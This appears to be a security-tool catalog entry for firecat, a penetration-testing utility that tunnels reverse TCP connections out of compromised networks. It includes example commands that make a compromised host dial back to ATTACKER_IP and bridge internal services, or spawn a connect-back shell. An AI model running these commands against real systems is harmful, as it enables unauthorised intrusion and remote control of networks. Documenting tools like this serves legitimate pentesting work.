---
name: "firecat"
categories:
  - blackarch-networking
version: "6.b5205c8"
homepage: "https://github.com/BishopFox/firecat"
packaged-by: [blackarch]
blackarch-builddate: "2016-12-31"
build-system: scripts
license: MIT
meta-checked: "2026-11-09"
github-repo: "BishopFox/firecat"
github-stars: 135
github-pushed: "2016-01-11"
github-archived: false
github-issues: 2
github-match: "exact"
gh-checked: "2026-11-07"
worth: 2.5
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# firecat

> Reverse TCP tunnel broker: the target dials out, then you reach any internal host:port through the tunnel.

## What it's for

firecat (Bishop Fox, formerly Stach & Liu) punches reverse TCP tunnels out
of compromised or egress-only networks. The target-side instance initiates
an outbound TCP connection to the consultant-side instance, so no inbound
rule is needed; once the tunnel exists, the consultant connects to a local
firecat port and firecat bridges that connection to an arbitrary host and
port inside the target network — even past NAT. It also offers a
connect-back shell mode. The tunnel is plain TCP with no encryption or
traffic hiding. The two ends run in explicit modes: consultant (`-m 0`)
and target (`-m 1`).

## Typical use cases

### Consultant side: listen for the tunnel and your connection

Bring up both listener ports on your own host.

```
./firecat -m 0 -t 4444 -s 3389
```

Outcome: waits for the target to connect on port 4444 and for you on port
3389; once the target-side instance links up, any client you point at
localhost:3389 is transparently bridged through the tunnel to whatever the
target end dials.

### Target side: bridge an internal service out

Run on the compromised host with only outbound access.

```
./firecat -m 1 -h ATTACKER_IP -t 4444 -H target -s 3389
```

Outcome: connects back to ATTACKER_IP:4444, then opens target:3389 inside
its own network; data between the consultant's local port and that
internal service flows through the established tunnel.

### Target side: throw a connect-back shell

Skip the port bridging and just get a shell.

```
./firecat -m 1 -h ATTACKER_IP -t 4444 -e
```

Outcome: after dialing back to ATTACKER_IP:4444, the target spawns a shell
over the tunnel (a Windows command shell or a Unix `/bin/sh`) instead of
bridging a port.

*No corpus evidence — derived from upstream documentation.*
